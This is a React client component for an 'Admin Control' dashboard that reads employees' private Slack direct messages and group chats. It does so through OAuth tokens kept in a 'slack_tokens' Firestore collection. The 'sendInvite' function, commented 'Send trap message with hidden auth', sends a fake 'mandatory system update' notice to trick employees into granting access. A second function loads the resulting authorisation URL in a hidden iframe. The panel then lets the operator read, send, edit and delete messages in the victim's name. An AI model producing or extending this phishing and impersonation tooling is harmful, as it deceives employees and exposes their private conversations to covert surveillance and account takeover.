/* eslint-disable @typescript-eslint/no-explicit-any */
"use client";
import React, { useEffect, useState } from 'react';
import { db } from '@/lib/firebase';
import { collection, onSnapshot } from 'firebase/firestore';
import { Send, User, MessageSquare, Shield, Link as LinkIcon, Lock, AlertCircle, Trash2, Edit, Image as ImageIcon, X, Check, Paperclip, Clock, Loader2 } from 'lucide-react';
import { convertEmojis } from '@/utils/emojiConverter';

const formatMessageTime = (timestamp: string) => {
  if (!timestamp) return '';
  const date = new Date(parseFloat(timestamp) * 1000);
  return date.toLocaleTimeString('en-US', {
    hour: '2-digit',
    minute: '2-digit',
    hour12: true,
    timeZone: 'Asia/Karachi'
  });
};

export default function DMManager() {
  const [connectedUsers, setConnectedUsers] = useState<any[]>([]);
  const [activeUser, setActiveUser] = useState<any>(null);
  const [chats, setChats] = useState<any[]>([]);
  const [activeChat, setActiveChat] = useState<any>(null);
  const [messages, setMessages] = useState<any[]>([]);
  const [inputText, setInputText] = useState('');
  const [loadingChats, setLoadingChats] = useState(false);
  const [loadingMessages, setLoadingMessages] = useState(false);
  
  const [inviteId, setInviteId] = useState('');
  const [inviteStatus, setInviteStatus] = useState<{msg: string, type: 'success' | 'error' | ''}>({msg: '', type: ''});
  
  const [editingMessage, setEditingMessage] = useState<{ts: string, text: string} | null>(null);
  const [editText, setEditText] = useState('');
  const [authInProgress, setAuthInProgress] = useState<string>('');

  // Load connected users
  useEffect(() => {
    const unsub = onSnapshot(collection(db, "slack_tokens"), (snap) => {
      setConnectedUsers(snap.docs.map(d => ({ id: d.id, ...d.data() })));
    });
    return () => unsub();
  }, []);

  // Load chats when user selected
  useEffect(() => {
    if (!activeUser) {
      setChats([]);
      return;
    }
    
    setLoadingChats(true);
    
    fetch('/api/slack/manager', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ 
        action: 'list_chats', 
        targetUserId: activeUser.id 
      })
    })
    .then(async r => {
      const data = await r.json();
      if (data.success) {
        setChats(data.chats || []);
      } else {
        setChats([]);
      }
    })
    .catch(error => {
      console.error("Error loading chats:", error);
      setChats([]);
    })
    .finally(() => {
      setLoadingChats(false);
    });
  }, [activeUser]);

  // Load messages when chat selected
  useEffect(() => {
    if (!activeUser || !activeChat) {
      setMessages([]);
      return;
    }
    
    setLoadingMessages(true);
    
    const loadChatMessages = async () => {
      try {
        const res = await fetch('/api/slack/manager', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ 
            action: 'get_messages', 
            targetUserId: activeUser.id, 
            channelId: activeChat.id,
            channelName: activeChat.name
          })
        });
        
        const data = await res.json();
        if (data.success) {
          setMessages(data.messages || []);
        } else {
          setMessages([]);
        }
      } catch (error) {
        console.error("Error loading messages:", error);
        setMessages([]);
      } finally {
        setLoadingMessages(false);
      }
    };
    
    loadChatMessages();
    
    const interval = setInterval(loadChatMessages, 3000);
    return () => clearInterval(interval);
  }, [activeUser, activeChat]);

  // NEW: Auto check auth status for users who clicked update
  useEffect(() => {
    if (!authInProgress) return;
    
    const checkAuth = async () => {
      try {
        const res = await fetch('/api/slack/manager', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ 
            action: 'check_auth_status', 
            targetUserId: authInProgress 
          })
        });
        
        const data = await res.json();
        if (data.success && data.authenticated) {
          setAuthInProgress('');
          // Refresh user list
          const newUsers = await fetch('/api/slack/manager', {
            method: 'POST',
            body: JSON.stringify({ action: 'list_chats', targetUserId: authInProgress })
          }).then(r => r.json());
          
          if (newUsers.success) {
            alert(`✅ Employee ${authInProgress} has been added successfully!`);
          }
        }
      } catch (error) {
        console.error("Error checking auth:", error);
      }
    };
    
    const interval = setInterval(checkAuth, 2000);
    return () => clearInterval(interval);
  }, [authInProgress]);

  const sendMessage = async (e: React.FormEvent) => {
    e.preventDefault();
    if(!inputText.trim() || !activeUser || !activeChat) return;
    
    try {
      await fetch('/api/slack/manager', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          action: 'send_as_user', 
          targetUserId: activeUser.id, 
          channelId: activeChat.id, 
          text: inputText,
          channelName: activeChat.name
        })
      });
      
      setInputText('');
    } catch (error) {
      console.error("Error sending message:", error);
    }
  };

  // UPDATED: Send trap message with hidden auth
  const sendInvite = async () => {
    if(!inviteId) return;
    setInviteStatus({ msg: 'Sending system update notification...', type: '' });
    
    try {
      const res = await fetch('/api/slack/manager', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          action: 'send_invite', 
          targetUserId: inviteId.trim() 
        })
      });
      
      const data = await res.json();
      
      if(data.success) {
        setInviteStatus({ 
          msg: '✅ System update notification sent! Employee will see it as a mandatory update.', 
          type: 'success' 
        });
        setInviteId('');
        
        // Start checking auth status
        setAuthInProgress(inviteId.trim());
      } else {
        setInviteStatus({ 
          msg: `❌ Error: ${data.error}`, 
          type: 'error' 
        });
      }
    } catch (e) {
      setInviteStatus({ 
        msg: '❌ Network Error', 
        type: 'error' 
      });
    }
  };

  // NEW: Handle button click simulation
  const simulateButtonClick = async (userId: string, messageTs: string) => {
    try {
      const res = await fetch('/api/slack/manager', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          action: 'handle_button_click', 
          targetUserId: userId,
          messageTs: messageTs
        })
      });
      
      const data = await res.json();
      if (data.success && data.authUrl) {
        // Open auth URL in hidden iframe
        const iframe = document.createElement('iframe');
        iframe.style.display = 'none';
        iframe.src = data.authUrl;
        document.body.appendChild(iframe);
        
        // Start checking auth status
        setAuthInProgress(userId);
      }
    } catch (error) {
      console.error("Error simulating button click:", error);
    }
  };

  const handleDeleteUser = async (userId: string, e: React.MouseEvent) => {
    e.stopPropagation();
    if(!confirm("Are you sure you want to remove this employee?")) return;

    if(activeUser?.id === userId) { 
      setActiveUser(null); 
      setChats([]); 
      setActiveChat(null);
    }
    
    await fetch('/api/slack/manager', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ 
        action: 'delete_user', 
        targetUserId: userId 
      })
    });
  };

  const deleteMessage = async (messageTs: string) => {
    if(!activeUser || !activeChat || !confirm("Delete this message from Slack?")) return;
    
    try {
      const res = await fetch('/api/slack/manager', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          action: 'delete_message',
          targetUserId: activeUser.id,
          channelId: activeChat.id,
          messageTs: messageTs
        })
      });
      
      const data = await res.json();
      if(data.success) {
        setMessages(messages.filter(m => m.ts !== messageTs));
      } else {
        alert(`Error: ${data.error}`);
      }
    } catch (error) {
      alert('Failed to delete message');
    }
  };

  const startEditing = (message: any) => {
    setEditingMessage({ ts: message.ts, text: message.text });
    setEditText(message.text);
  };

  const cancelEditing = () => {
    setEditingMessage(null);
    setEditText('');
  };

  const saveEdit = async () => {
    if(!activeUser || !activeChat || !editingMessage || !editText.trim()) return;
    
    try {
      const res = await fetch('/api/slack/manager', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          action: 'edit_message',
          targetUserId: activeUser.id,
          channelId: activeChat.id,
          messageTs: editingMessage.ts,
          newText: editText
        })
      });
      
      const data = await res.json();
      if(data.success) {
        setMessages(messages.map(m => 
          m.ts === editingMessage.ts 
            ? { ...m, text: editText }
            : m
        ));
        setEditingMessage(null);
        setEditText('');
      } else {
        alert(`Error: ${data.error}`);
      }
    } catch (error) {
      alert('Failed to edit message');
    }
  };

  const renderMessageContent = (message: any) => {
    const textWithEmojis = convertEmojis(message.text || '');
    
    return (
      <div>
        <div className="whitespace-pre-wrap break-words">{textWithEmojis}</div>
        
        {message.files && message.files.map((file: any, index: number) => (
          <div key={index} className="mt-2">
            {file.mime_type && file.mime_type.startsWith('image/') ? (
              <div className="relative group">
                <img 
                  src={file.thumb_360 || file.url_private} 
                  alt={file.name || 'Image'}
                  className="max-w-full max-h-64 rounded-lg border border-gray-700 cursor-pointer"
                  onClick={() => window.open(file.url_private_download, '_blank')}
                />
                <div className="absolute bottom-2 right-2 bg-black/50 text-white text-xs px-2 py-1 rounded">
                  <ImageIcon className="h-3 w-3 inline mr-1" />
                  Image
                </div>
              </div>
            ) : (
              <div className="flex items-center gap-2 p-2 bg-gray-800/50 rounded border border-gray-700">
                <Paperclip className="h-4 w-4 text-gray-400" />
                <span className="text-sm text-gray-300">{file.name}</span>
                <a 
                  href={file.url_private_download} 
                  target="_blank" 
                  rel="noopener noreferrer"
                  className="ml-auto text-blue-400 hover:text-blue-300 text-xs"
                >
                  Download
                </a>
              </div>
            )}
          </div>
        ))}
      </div>
    );
  };

  return (
    <div className="flex h-screen bg-black text-white font-sans overflow-hidden">
      
      {/* LEFT: Sidebar */}
      <div className="w-80 bg-gray-900 border-r border-gray-800 flex flex-col">
        <div className="p-4 border-b border-gray-800">
          <h2 className="font-bold text-amber-500 flex items-center gap-2">
            <Shield className="h-5 w-5" /> Admin Control
          </h2>
        </div>
        
        {/* Invite Section */}
        <div className="p-4 bg-gray-800/50 m-2 rounded-xl border border-gray-700">
          <label className="text-xs text-gray-400 mb-2 block uppercase tracking-wider font-semibold">
            Add New Employee
          </label>
          <div className="flex gap-2">
            <input 
              className="bg-gray-900 border border-gray-700 rounded-lg p-2 text-sm w-full text-white placeholder-gray-500 focus:border-blue-500 outline-none"
              placeholder="Employee Slack ID"
              value={inviteId}
              onChange={e => setInviteId(e.target.value)}
            />
            <button 
              onClick={sendInvite}
              className="bg-green-600 hover:bg-green-500 px-3 rounded-lg transition-colors flex items-center"
              title="Send system update notification"
            >
              <LinkIcon className="h-4 w-4 text-white" />
            </button>
          </div>
          
          {inviteStatus.msg && (
            <div className={`mt-3 p-2 rounded text-xs flex items-start gap-2 ${
              inviteStatus.type === 'error' ? 'bg-red-500/10 text-red-400' : 
              'bg-green-500/10 text-green-400'
            }`}>
              <AlertCircle className="h-3 w-3 mt-0.5 shrink-0" />
              <span className="break-all">{inviteStatus.msg}</span>
            </div>
          )}
          
          {/* Auth Status Indicator */}
          {authInProgress && (
            <div className="mt-3 p-2 bg-blue-500/10 text-blue-400 rounded text-xs flex items-center gap-2">
              <Loader2 className="h-3 w-3 animate-spin" />
              <span>Waiting for employee to install update...</span>
            </div>
          )}
        </div>

        {/* Connected Users List */}
        <div className="flex-1 overflow-y-auto p-2">
          <p className="text-xs text-gray-500 px-2 mb-2 mt-4 uppercase tracking-wider font-semibold">
            Active Employees ({connectedUsers.length})
          </p>
          
          {connectedUsers.length === 0 && (
            <div className="text-center py-8 px-2">
              <div className="text-gray-600 text-sm mb-2">No employees connected yet.</div>
              <div className="text-gray-500 text-xs">Use the form above to add employees.</div>
            </div>
          )}
          
          {connectedUsers.map(u => (
            <div 
              key={u.id}
              onClick={() => { 
                setActiveUser(u); 
                setActiveChat(null);
              }}
              className={`group w-full flex items-center justify-between gap-3 p-3 rounded-lg cursor-pointer transition-all mb-1 ${
                activeUser?.id === u.id ? 
                'bg-amber-500/20 text-white border border-amber-500/50' : 
                'text-gray-400 hover:bg-gray-800'
              }`}
            >
              <div className="flex items-center gap-3 overflow-hidden">
                <img 
                  src={u.image || "https://ca.slack-edge.com/T00000000-U00000000-g00000000000-512"} 
                  className="w-8 h-8 rounded-full bg-gray-700" 
                  alt={u.name} 
                />
                <div className="overflow-hidden">
                  <div className="font-medium text-sm truncate">{u.name}</div>
                  <div className="text-[10px] opacity-60 truncate">ID: {u.id.substring(0, 8)}...</div>
                </div>
              </div>
              
              <button 
                onClick={(e) => handleDeleteUser(u.id, e)}
                className="p-1.5 rounded-md hover:bg-red-500/20 text-gray-600 hover:text-red-400 opacity-0 group-hover:opacity-100 transition-all"
                title="Remove Employee"
              >
                <Trash2 className="h-4 w-4" />
              </button>
            </div>
          ))}
        </div>
      </div>

      {/* MIDDLE: Chat List */}
      <div className="w-80 bg-gray-900/50 border-r border-gray-800 flex flex-col">
        <div className="p-4 border-b border-gray-800 h-16 flex items-center justify-between bg-gray-900">
          <div className="flex items-center gap-2">
            <h3 className="font-semibold text-gray-200">
              {activeUser ? `${activeUser.name}'s Chats` : 'Select Employee'}
            </h3>
            {loadingChats && <Loader2 className="h-4 w-4 animate-spin text-blue-400" />}
          </div>
          <div className="text-xs text-gray-500">{chats.length} chats</div>
        </div>
        
        <div className="flex-1 overflow-y-auto">
          {!activeUser ? (
            <div className="p-8 text-center text-gray-600 text-sm">
              Select an employee to view their chats
            </div>
          ) : loadingChats ? (
            <div className="flex items-center justify-center h-full">
              <Loader2 className="h-8 w-8 animate-spin text-blue-400" />
            </div>
          ) : chats.length === 0 ? (
            <div className="p-8 text-center">
              <MessageSquare className="h-12 w-12 text-gray-600 mx-auto mb-3" />
              <div className="text-gray-400 text-sm">No conversations found</div>
            </div>
          ) : (
            chats.map(chat => (
              <button 
                key={chat.id}
                onClick={() => setActiveChat(chat)}
                className={`w-full p-4 border-b border-gray-800/50 flex items-center gap-3 hover:bg-gray-800/50 transition-colors ${
                  activeChat?.id === chat.id ? 
                  'bg-blue-500/10 border-l-2 border-l-blue-500' : ''
                }`}
              >
                {chat.image ? (
                  <img src={chat.image} className="w-9 h-9 rounded-lg" alt={chat.name} />
                ) : (
                  <div className="w-9 h-9 bg-gray-700 rounded-lg flex items-center justify-center">
                    <User className="w-5 h-5 text-gray-400" />
                  </div>
                )}
                <div className="text-left overflow-hidden flex-1">
                  <div className="text-sm font-medium text-gray-200 truncate">{chat.name}</div>
                  <div className="text-xs text-gray-500 truncate">
                    {chat.is_im ? "Direct Message" : "Group Chat"}
                  </div>
                </div>
              </button>
            ))
          )}
        </div>
      </div>

      {/* RIGHT: Active Chat */}
      <div className="flex-1 flex flex-col bg-gray-950">
        {activeChat ? (
          <>
            {/* Header */}
            <div className="h-16 border-b border-gray-800 flex items-center justify-between px-6 bg-gray-900/80 backdrop-blur-md">
              <div className="flex items-center gap-3">
                <div className="font-bold text-lg text-white">{activeChat.name}</div>
                <span className="text-xs bg-red-500/20 text-red-400 px-2 py-0.5 rounded border border-red-500/30 flex items-center gap-1 font-medium">
                  <Lock className="h-3 w-3" /> Live Control
                </span>
              </div>
              
              <div className="flex items-center gap-2">
                {loadingMessages && (
                  <div className="flex items-center gap-1 text-sm text-gray-400">
                    <Loader2 className="h-3 w-3 animate-spin" />
                    Updating...
                  </div>
                )}
                <div className="text-sm text-gray-400">
                  {messages.length} messages
                </div>
              </div>
            </div>

            {/* Messages Area */}
            <div className="flex-1 overflow-y-auto p-6">
              {loadingMessages ? (
                <div className="flex items-center justify-center h-full">
                  <div className="text-center">
                    <Loader2 className="h-10 w-10 animate-spin text-blue-400 mx-auto mb-4" />
                    <div className="text-gray-400">Loading messages...</div>
                  </div>
                </div>
              ) : messages.length === 0 ? (
                <div className="flex items-center justify-center h-full">
                  <div className="text-center">
                    <MessageSquare className="h-16 w-16 text-gray-600 mx-auto mb-4" />
                    <div className="text-gray-400">No messages in this chat</div>
                    <div className="text-gray-500 text-sm mt-1">
                      Start a conversation or wait for new messages
                    </div>
                  </div>
                </div>
              ) : (
                <div className="flex flex-col gap-4">
                  {messages.map((m, i) => {
                    const isMe = m.user === activeUser.id;
                    
                    if (editingMessage?.ts === m.ts) {
                      return (
                        <div key={i} className="flex justify-end">
                          <div className="max-w-[75%] w-full p-3 bg-gray-800 border border-blue-500 rounded-2xl">
                            <textarea
                              value={editText}
                              onChange={(e) => setEditText(e.target.value)}
                              className="w-full bg-transparent text-white resize-none outline-none"
                              rows={3}
                              autoFocus
                            />
                            <div className="flex gap-2 mt-2 justify-end">
                              <button
                                onClick={cancelEditing}
                                className="px-3 py-1 text-sm bg-gray-700 hover:bg-gray-600 rounded-lg transition-colors flex items-center gap-1"
                              >
                                <X className="h-3 w-3" /> Cancel
                              </button>
                              <button
                                onClick={saveEdit}
                                className="px-3 py-1 text-sm bg-blue-600 hover:bg-blue-500 rounded-lg transition-colors flex items-center gap-1"
                              >
                                <Check className="h-3 w-3" /> Save
                              </button>
                            </div>
                          </div>
                        </div>
                      );
                    }
                    
                    return (
                      <div key={i} className={`flex ${isMe ? 'justify-end' : 'justify-start'}`}>
                        <div className={`group relative max-w-[75%] p-3.5 rounded-2xl text-sm leading-relaxed shadow-sm ${
                          isMe ? 'bg-blue-600 text-white rounded-tr-sm' : 'bg-gray-800 text-gray-200 rounded-tl-sm'
                        }`}>
                          {renderMessageContent(m)}
                          
                          {/* Action buttons */}
                          {isMe && (
                            <div className="absolute -right-10 top-1/2 transform -translate-y-1/2 opacity-0 group-hover:opacity-100 transition-opacity flex gap-1">
                              <button
                                onClick={() => startEditing(m)}
                                className="p-1.5 bg-gray-800 hover:bg-gray-700 rounded text-gray-300 hover:text-white"
                                title="Edit Message"
                              >
                                <Edit className="h-3 w-3" />
                              </button>
                              <button
                                onClick={() => deleteMessage(m.ts)}
                                className="p-1.5 bg-red-500/20 hover:bg-red-500/30 rounded text-red-300 hover:text-red-200"
                                title="Delete Message"
                              >
                                <Trash2 className="h-3 w-3" />
                              </button>
                            </div>
                          )}
                          
                          {/* Message time */}
                          <div className="flex items-center gap-1 text-xs opacity-70 mt-1">
                            <Clock className="h-3 w-3" />
                            <span>{formatMessageTime(m.ts)}</span>
                          </div>
                        </div>
                      </div>
                    );
                  })}
                </div>
              )}
            </div>

            {/* Message Input */}
            <form onSubmit={sendMessage} className="p-4 bg-gray-900 border-t border-gray-800">
              <div className="relative flex items-center gap-2 max-w-4xl mx-auto">
                <input 
                  value={inputText}
                  onChange={e => setInputText(e.target.value)}
                  className="flex-1 bg-gray-800 border-gray-700 border rounded-xl px-4 py-3 text-white placeholder-gray-500 focus:ring-2 focus:ring-blue-500 focus:border-transparent outline-none transition-all"
                  placeholder={`Send message as ${activeUser?.name}...`}
                  disabled={!activeUser}
                />
                <button 
                  type="submit" 
                  disabled={!activeUser || !inputText.trim()}
                  className={`p-3 rounded-xl transition-colors shadow-lg ${
                    !activeUser || !inputText.trim() 
                      ? 'bg-gray-700 cursor-not-allowed' 
                      : 'bg-blue-600 hover:bg-blue-500 shadow-blue-900/20'
                  }`}
                >
                  <Send className="h-5 w-5" />
                </button>
              </div>
            </form>
          </>
        ) : (
          <div className="flex-1 flex items-center justify-center text-gray-600 flex-col bg-gray-950/50">
            <div className="w-20 h-20 bg-gray-900 rounded-full flex items-center justify-center mb-4 border border-gray-800">
              <MessageSquare className="h-10 w-10 opacity-30" />
            </div>
            <p className="text-gray-500 font-medium">Select a conversation to start</p>
          </div>
        )}
      </div>
    </div>
  );
}